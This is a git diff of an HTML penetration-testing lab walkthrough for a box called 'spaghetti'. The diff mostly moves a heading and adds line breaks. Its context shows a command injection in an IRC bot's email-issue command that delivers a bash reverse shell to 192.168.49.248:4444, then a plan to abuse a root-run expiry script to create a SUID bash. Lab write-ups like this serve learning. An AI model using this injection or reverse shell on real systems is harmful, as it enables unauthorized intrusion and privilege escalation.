@@ -110,20 +110,20 @@ Service detection performed. Please report any incorrect results at https://nmap
         <li>The bot is PyBot and we have the link to the bot's github page</li>
     </ul>
 
+    <h2><a id="hostmaster">Shell - hostmaster</a></h2>
+
     <li>On the github page for the bot and we can see a vulnerability in the code behind the command allowing us to submit email issues.</li>
         <ul>
             <li>The code for the command to send a message to report an issue.</li>
             <ul>
-                <li>The description that we sends gets assigned to the variable "body"</li>
+                <li>The description that we send gets assigned to the variable "body"</li>
+                <img src="../images/spaghetti/code_body_variable.png">
             </ul>
-            <img src="../images/spaghetti/code_body_variable.png">
         </ul>
         <ul>
             <li>The code that sends the email.</li>
         <img src="../images/spaghetti/irc_bot_code.png">
     </ul>
-
-    <h2><a id="hostmaster">Shell - hostmaster</a></h2>
 
     <li>The user input does not go through any sanitization.  It gets passed directly into the "cmd" variable which then gets executed as a shell command.  In order to exploit this all we need to do is add a pipe before whatever command we want to send in the "description" portion of the command for email issues.</li>
 
@@ -134,6 +134,9 @@ Service detection performed. Please report any incorrect results at https://nmap
         <li>Sent: email:test@test.com description:| bash -c &#039;bash -i &gt;&amp; /dev/tcp/192.168.49.248/4444 0&gt;&amp;1&#039;</li>
     </ul>
     <img src="../images/spaghetti/revshell.png">
+
+    <br>
+    <br>
     
     <li>The first thing upon getting a reverse shell is upgrading it to a pty, enabling the "clear" command, and enabling auto-compelete.</li>
     
@@ -171,6 +174,8 @@ hostmaster@spaghetti:/tmp$ ./pspy64&amp;#13;&amp;#10;./pspy64&amp;#13;&amp;#10;p
     </pre>
 
     <li>Now that we know root is running this command, we also know that we can get command execution as root if we can exploit this script somehow.  This script is checking the user's password expiration date and if it is going to expire in 7, 14, or 30 days, then it sends them a notification.  ${RESULT[0]} is where the username from the mysql table "mailbox" is inserted into the script.  We are going to create a malicious script that we will pass to /opt/check_mailpass_expiration.sh that will create a root owned SUID bash file in the /tmp directory.</li>
+
+    <br>
 
     <li>The malicious script</li>
 
